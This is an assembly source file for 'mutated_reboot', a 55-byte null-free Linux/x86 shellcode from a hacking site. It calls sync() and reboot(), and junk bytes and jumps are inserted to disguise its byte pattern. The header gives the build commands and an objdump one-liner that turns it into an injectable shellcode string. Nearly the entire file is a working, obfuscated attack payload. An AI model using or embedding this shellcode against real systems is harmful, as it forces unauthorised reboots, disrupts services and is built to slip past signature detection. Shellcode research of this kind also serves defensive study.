; Mutated Reboot - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   mutated_reboot
;
;   * 55 bytes
;   * null-free
;   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)
;
;
;   # nasm -f elf32 mutated_reboot.asm
;   # ld -m elf_i386 mutated_reboot.o -o mutated_reboot
;   # for i in $(objdump -d mutated_reboot |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
;   
;   Testing
;   * Only run it in a Virtual Machine!!! Your system will reboot. Use at your own risk!
;   * To work properly, you must be su!


global _start

section .text

_start:
	; void sync(void);
	; sync()

	sub edi, edi
	jz $+3
	db 0xe8
	add edi, 36
	xchg eax, edi
	jmp $+3
	db 0xe1
	int 0x80


	; int reboot(int magic, int magic2, int cmd, void *arg);
	; reboot(0xfee1dead, 0x28121969, 0x1234567, not_used)
	
	jmp $+3
	db 0xff
	push 0x29
	pop ecx
	jmp $+3
	db 0x01
       	mov ebx, 0x1234567
      	mov edx, 0xffc29bca
	xor edx, ebx
	jnz $+3
	db 0xe7
	xchg ebx, edx
	lea eax, [ecx+0x2f]
	lea ecx, [ecx+0x28121940]
	jmp $+4
	db 0xe8, 0x01
       	int 0x80
